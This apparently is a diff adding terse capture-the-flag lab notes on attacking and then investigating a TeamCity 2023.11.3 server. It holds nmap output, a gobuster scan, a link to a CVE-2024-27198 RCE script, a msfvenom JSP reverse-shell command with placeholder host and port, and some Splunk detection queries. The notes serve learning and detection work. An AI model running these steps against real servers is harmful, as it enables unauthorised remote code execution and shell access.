@@ -1,0 +1,93 @@
+export IP=10.10.98.97
+
+nmap scan
+nmap $IP -v -oN nmap.log -A
+
+=====
+PORT      STATE SERVICE  VERSION
+22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 a5:d5:1a:65:df:65:31:fc:52:99:29:32:27:25:92:0c (RSA)
+|   256 65:cf:ab:1e:dc:c8:e1:22:95:ba:97:13:fb:60:cf:5f (ECDSA)
+|_  256 1d:c9:f0:6a:77:0c:bc:42:7e:57:45:8e:1a:db:98:38 (ED25519)
+80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Maintenance
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+50000/tcp open  ibm-db2?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 401 
+|     TeamCity-Node-Id: MAIN_SERVER
+|     WWW-Authenticate: Basic realm="TeamCity"
+|     WWW-Authenticate: Bearer realm="TeamCity"
+|     Cache-Control: no-store
+|     Content-Type: text/plain;charset=UTF-8
+|     Date: Thu, 17 Oct 2024 14:34:28 GMT
+|     Connection: close
+|     Authentication required
+|     login manually go to "/login.html" page
+|   drda, ibm-db2: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Thu, 17 Oct 2024 14:34:29 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|     Request</h1></body></html>
+|   ibm-db2-das: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 435
+|     Date: Thu, 17 Oct 2024 14:34:28 GMT
+|     Connection: close
+|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
+|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
+|_    Request</h1></body></html>
+
+====
+
+
+========
+gobuster scan
+gobuster dir --url http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
+
+
+========
+
+
+========
+search for auth bypass teamcity 'Version 2023.11.3'
+
+create msfvenom payload - (see below section)
+
+then run the below command 
+
+https://github.com/W01fh4cker/CVE-2024-27198-RCE/blob/main/CVE-2024-27198-RCE.py
+
+execute this python script - get the username and password
+
+python script.py -t http://$ip:$port -f payload.jsp
+
+========
+
+========
+create msfvenom payload 
+msfveno -p java/jsp_shell_reverse_tcp LHOST=ip LPORT=port -f raw -o shell.jsp
+
+========
+
+
+
+================ Blue Team
+
+->> open splunk -> click search -> change search timeline to 'allltime'
+1. source="/var/log/auth.log" *useradd*
+
+2. source="/var/log/dpkg.log" date_month="july" date_mday="4" *install*
+
+3. source="/opt/teamcity/TeamCity/logs/teamcity-activities.log" *plugin*
